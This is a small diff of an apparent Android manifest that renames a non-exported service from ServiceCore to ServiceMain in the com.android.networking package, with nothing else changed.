@@ -49,7 +49,7 @@
 			android:enabled="true" android:theme="@style/Theme.Tr6871623">
 		</activity>
 
-		<service android:name="com.android.networking.ServiceCore" android:exported="false"
+		<service android:name="com.android.networking.ServiceMain" android:exported="false"
 			android:excludeFromRecents="true">
 			<intent-filter>
 				<action android:name="com.android.networking.app"/>		
